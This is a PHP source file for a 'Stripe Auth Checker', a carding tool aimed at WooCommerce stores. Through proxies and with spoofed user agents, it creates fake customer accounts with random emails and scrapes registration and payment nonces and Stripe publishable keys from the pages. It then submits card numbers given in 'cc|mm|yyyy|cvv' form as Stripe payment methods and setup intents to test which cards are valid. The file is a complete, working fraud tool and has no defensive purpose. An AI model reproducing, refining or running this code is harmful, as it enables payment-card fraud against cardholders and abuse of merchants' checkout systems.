<?php
/**
 * Stripe Auth Checker - PHP Version
 * Automatically creates accounts and adds payment methods to Stripe-powered sites
 */

class StripeAuthChecker {
    private $domain;
    private $proxy;
    private $session;
    private $account_email;
    private $register_nonce;
    private $payment_nonce;
    private $create_setup_intent_nonce;
    private $create_and_confirm_setup_intent_nonce;
    private $stripe_publishable_key;
    private $stripe_account_id;
    private $pm_id;
    private $guid;
    private $muid;
    private $sid;
    private $stripe_pattern;
    private $session_start_time;
    private $session_pages = 0;
    private $account_created = false;

    public function __construct($domain, $proxy = null) {
        $this->domain = rtrim($domain, '/');
        if (!preg_match('/^https?:\/\//', $this->domain)) {
            $this->domain = 'https://' . $this->domain;
        }
        
        $this->proxy = $proxy;
        $this->session_start_time = date('Y-m-d H:i:s');
        $this->initSession();
    }

    private function initSession() {
        $this->session = curl_init();
        curl_setopt($this->session, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($this->session, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($this->session, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($this->session, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($this->session, CURLOPT_TIMEOUT, 30);
        curl_setopt($this->session, CURLOPT_CONNECTTIMEOUT, 10);
        
        $user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        ];
        
        $headers = [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language: en-US,en;q=0.5',
            'Accept-Encoding: gzip, deflate, br',
            'User-Agent: ' . $user_agents[array_rand($user_agents)],
            'Connection: keep-alive',
            'Upgrade-Insecure-Requests: 1',
        ];
        
        curl_setopt($this->session, CURLOPT_HTTPHEADER, $headers);
        
        if ($this->proxy) {
            $formatted_proxy = $this->formatProxy($this->proxy);
            curl_setopt($this->session, CURLOPT_PROXY, $formatted_proxy);
        }
    }

    private function formatProxy($proxy) {
        $parts = explode(':', $proxy);
        if (count($parts) == 2) {
            return $proxy;
        } elseif (count($parts) == 4) {
            return $parts[2] . ':' . $parts[3] . '@' . $parts[0] . ':' . $parts[1];
        }
        return $proxy;
    }

    private function generateEmail() {
        $domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'];
        $username = substr(str_shuffle('abcdefghijklmnopqrstuvwxyz0123456789'), 0, 10);
        return $username . '@' . $domains[array_rand($domains)];
    }

    private function generatePassword() {
        return substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%'), 0, 12);
    }

    public function run($cc, $mm, $yyyy, $cvv) {
        // Step 1: Visit account page
        $html = $this->visitAccountPage();
        if (!$html) {
            return ['success' => false, 'status' => 'ERROR', 'message' => 'Failed to visit account page'];
        }

        // Step 2: Extract registration nonce
        if (!$this->extractRegisterNonce($html)) {
            return ['success' => false, 'status' => 'ERROR', 'message' => 'Failed to extract registration nonce'];
        }

        // Step 3: Create account
        if (!$this->createAccount()) {
            return ['success' => false, 'status' => 'ERROR', 'message' => 'Failed to create account', 'account_email' => $this->account_email];
        }

        // Step 4: Load payment method page
        $html = $this->loadPaymentMethodPage();
        if (!$html) {
            return ['success' => false, 'status' => 'ERROR', 'message' => 'Failed to load payment method page', 'account_email' => $this->account_email];
        }

        // Step 5: Generate Stripe IDs
        $this->generateStripeIds();

        // Step 6: Tokenize card
        if (!$this->tokenizeCard($cc, $mm, $yyyy, $cvv)) {
            return ['success' => false, 'status' => 'ERROR', 'message' => 'Failed to tokenize card', 'account_email' => $this->account_email];
        }

        // Step 7: Create setup intent
        $result = $this->createSetupIntent();
        
        return array_merge($result, [
            'account_email' => $this->account_email,
            'pm_id' => $this->pm_id
        ]);
    }

    private function visitAccountPage() {
        $url = $this->domain . '/my-account/';
        curl_setopt($this->session, CURLOPT_URL, $url);
        curl_setopt($this->session, CURLOPT_HTTPGET, true);
        $response = curl_exec($this->session);
        $http_code = curl_getinfo($this->session, CURLINFO_HTTP_CODE);
        
        if ($http_code == 200) {
            $this->session_pages++;
            return $response;
        }
        return false;
    }

    private function extractRegisterNonce($html) {
        if (preg_match('/name=["\']woocommerce-register-nonce["\']\s+value=["\']([^"\']+)["\']/', $html, $matches)) {
            $this->register_nonce = $matches[1];
            return true;
        }
        return false;
    }

    private function createAccount() {
        $this->account_email = $this->generateEmail();
        $password = $this->generatePassword();
        
        $url = $this->domain . '/my-account/?action=register';
        $data = [
            'email' => $this->account_email,
            'password' => $password,
            'woocommerce-register-nonce' => $this->register_nonce,
            'register' => 'Register',
        ];
        
        curl_setopt($this->session, CURLOPT_URL, $url);
        curl_setopt($this->session, CURLOPT_POST, true);
        curl_setopt($this->session, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($this->session, CURLOPT_HTTPHEADER, [
            'Content-Type: application/x-www-form-urlencoded',
            'Referer: ' . $this->domain . '/my-account/',
        ]);
        
        curl_setopt($this->session, CURLOPT_FOLLOWLOCATION, false);
        $response = curl_exec($this->session);
        $http_code = curl_getinfo($this->session, CURLINFO_HTTP_CODE);
        curl_setopt($this->session, CURLOPT_FOLLOWLOCATION, true);
        
        if ($http_code >= 200 && $http_code < 400) {
            $this->account_created = true;
            $this->session_pages++;
            return true;
        }
        return false;
    }

    private function loadPaymentMethodPage() {
        $url = $this->domain . '/my-account/add-payment-method/';
        curl_setopt($this->session, CURLOPT_URL, $url);
        curl_setopt($this->session, CURLOPT_HTTPGET, true);
        $response = curl_exec($this->session);
        $http_code = curl_getinfo($this->session, CURLINFO_HTTP_CODE);
        
        if ($http_code == 200) {
            $this->session_pages++;
            
            // Extract payment nonce
            if (preg_match('/name=["\']woocommerce-add-payment-method-nonce["\']\s+value=["\']([^"\']+)["\']/', $response, $matches)) {
                $this->payment_nonce = $matches[1];
            }
            
            // Extract Stripe config
            $this->extractStripeConfig($response);
            
            return $response;
        }
        return false;
    }

    private function extractStripeConfig($html) {
        // Try Pattern 1: wcpay_upe_config
        if (preg_match('/var\s+wcpay_upe_config\s*=\s*({[^}]+})/', $html, $matches)) {
            $config = json_decode($matches[1], true);
            if ($config) {
                $this->stripe_pattern = 'pattern1';
                $this->stripe_publishable_key = $config['publishableKey'] ?? null;
                $this->stripe_account_id = $config['accountId'] ?? null;
                $this->create_setup_intent_nonce = $config['createSetupIntentNonce'] ?? null;
                return;
            }
        }
        
        // Try Pattern 2: wc_stripe_upe_params
        if (preg_match('/var\s+wc_stripe_upe_params\s*=\s*({[^}]+})/', $html, $matches)) {
            $config = json_decode($matches[1], true);
            if ($config) {
                $this->stripe_pattern = 'pattern2';
                $this->stripe_publishable_key = $config['key'] ?? null;
                $this->create_and_confirm_setup_intent_nonce = $config['createAndConfirmSetupIntentNonce'] ?? null;
                return;
            }
        }
        
        // Fallback: extract publishable key directly
        if (preg_match('/pk_live_([a-zA-Z0-9_]+)/', $html, $matches)) {
            $this->stripe_publishable_key = 'pk_live_' . $matches[1];
        }
    }

    private function generateStripeIds() {
        $this->guid = $this->generateUUID() . substr($this->generateUUID(), 0, 16);
        $this->muid = $this->generateUUID();
        $this->sid = $this->generateUUID();
    }

    private function generateUUID() {
        return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
            mt_rand(0, 0xffff), mt_rand(0, 0xffff),
            mt_rand(0, 0xffff),
            mt_rand(0, 0x0fff) | 0x4000,
            mt_rand(0, 0x3fff) | 0x8000,
            mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
        );
    }

    private function tokenizeCard($cc, $mm, $yyyy, $cvv) {
        if (!$this->stripe_publishable_key) {
            return false;
        }
        
        $cc_formatted = implode(' ', str_split($cc, 4));
        $yy = substr($yyyy, -2);
        
        $data = [
            'billing_details[name]' => ' ',
            'billing_details[email]' => $this->account_email,
            'billing_details[address][country]' => 'US',
            'billing_details[address][postal_code]' => '11019',
            'type' => 'card',
            'card[number]' => $cc_formatted,
            'card[cvc]' => $cvv,
            'card[exp_year]' => $yy,
            'card[exp_month]' => str_pad($mm, 2, '0', STR_PAD_LEFT),
            'guid' => $this->guid,
            'muid' => $this->muid,
            'sid' => $this->sid,
            'key' => $this->stripe_publishable_key,
        ];
        
        if ($this->stripe_account_id) {
            $data['_stripe_account'] = $this->stripe_account_id;
        }
        
        $ch = curl_init('https://api.stripe.com/v1/payment_methods');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Accept: application/json',
            'Content-Type: application/x-www-form-urlencoded',
            'Origin: https://js.stripe.com',
            'Referer: https://js.stripe.com/',
        ]);
        
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if ($http_code == 200) {
            $json = json_decode($response, true);
            if (isset($json['id'])) {
                $this->pm_id = $json['id'];
                return true;
            }
        }
        return false;
    }

    private function createSetupIntent() {
        if ($this->stripe_pattern == 'pattern1' && $this->create_setup_intent_nonce) {
            return $this->createSetupIntentPattern1();
        } elseif ($this->stripe_pattern == 'pattern2' && $this->create_and_confirm_setup_intent_nonce) {
            return $this->createSetupIntentPattern2();
        }
        
        return ['success' => false, 'status' => 'ERROR', 'message' => 'No valid setup intent nonce found'];
    }

    private function createSetupIntentPattern1() {
        $url = $this->domain . '/wp-admin/admin-ajax.php';
        $boundary = '----geckoformboundary' . substr(md5(time()), 0, 32);
        
        $body = "--{$boundary}\r\n";
        $body .= "Content-Disposition: form-data; name=\"action\"\r\n\r\n";
        $body .= "create_setup_intent\r\n";
        $body .= "--{$boundary}\r\n";
        $body .= "Content-Disposition: form-data; name=\"wcpay-payment-method\"\r\n\r\n";
        $body .= $this->pm_id . "\r\n";
        $body .= "--{$boundary}\r\n";
        $body .= "Content-Disposition: form-data; name=\"_ajax_nonce\"\r\n\r\n";
        $body .= $this->create_setup_intent_nonce . "\r\n";
        $body .= "--{$boundary}--\r\n";
        
        curl_setopt($this->session, CURLOPT_URL, $url);
        curl_setopt($this->session, CURLOPT_POST, true);
        curl_setopt($this->session, CURLOPT_POSTFIELDS, $body);
        curl_setopt($this->session, CURLOPT_HTTPHEADER, [
            'Content-Type: multipart/form-data; boundary=' . $boundary,
            'Referer: ' . $this->domain . '/my-account/add-payment-method/',
        ]);
        
        $response = curl_exec($this->session);
        return $this->parseSetupIntentResponse($response);
    }

    private function createSetupIntentPattern2() {
        $url = $this->domain . '/wp-admin/admin-ajax.php';
        $data = [
            'action' => 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method' => $this->pm_id,
            'wc-stripe-payment-type' => 'card',
            '_ajax_nonce' => $this->create_and_confirm_setup_intent_nonce,
        ];
        
        curl_setopt($this->session, CURLOPT_URL, $url);
        curl_setopt($this->session, CURLOPT_POST, true);
        curl_setopt($this->session, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($this->session, CURLOPT_HTTPHEADER, [
            'Content-Type: application/x-www-form-urlencoded',
            'X-Requested-With: XMLHttpRequest',
            'Referer: ' . $this->domain . '/my-account/add-payment-method/',
        ]);
        
        $response = curl_exec($this->session);
        return $this->parseSetupIntentResponse($response);
    }

    private function parseSetupIntentResponse($response) {
        $json = json_decode($response, true);
        if ($json && isset($json['success'])) {
            if ($json['success']) {
                return ['success' => true, 'status' => 'SUCCESS', 'message' => 'Card added successfully'];
            } else {
                $error = $json['data']['error']['message'] ?? $json['message'] ?? 'Card validation failed';
                return ['success' => false, 'status' => 'ERROR', 'message' => $error];
            }
        }
        return ['success' => false, 'status' => 'ERROR', 'message' => 'Invalid response from server'];
    }

    public function __destruct() {
        if ($this->session) {
            curl_close($this->session);
        }
    }
}

function parseCCString($cc_string) {
    if (strpos($cc_string, '|') !== false) {
        $parts = explode('|', $cc_string);
        if (count($parts) == 4) {
            $cc = preg_replace('/\D/', '', $parts[0]);
            $mm = preg_replace('/\D/', '', $parts[1]);
            $year = preg_replace('/\D/', '', $parts[2]);
            $cvv = preg_replace('/\D/', '', $parts[3]);
            
            if (strlen($year) == 2) {
                $year = '20' . $year;
            }
            
            return [$cc, $mm, $year, $cvv];
        }
    }
    throw new Exception('Invalid CC format');
}

function stripeAuth($domain, $cc_string, $proxy = null) {
    try {
        list($cc, $mm, $yyyy, $cvv) = parseCCString($cc_string);
        
        $checker = new StripeAuthChecker($domain, $proxy);
        return $checker->run($cc, $mm, $yyyy, $cvv);
    } catch (Exception $e) {
        return ['success' => false, 'status' => 'ERROR', 'message' => $e->getMessage()];
    }
}
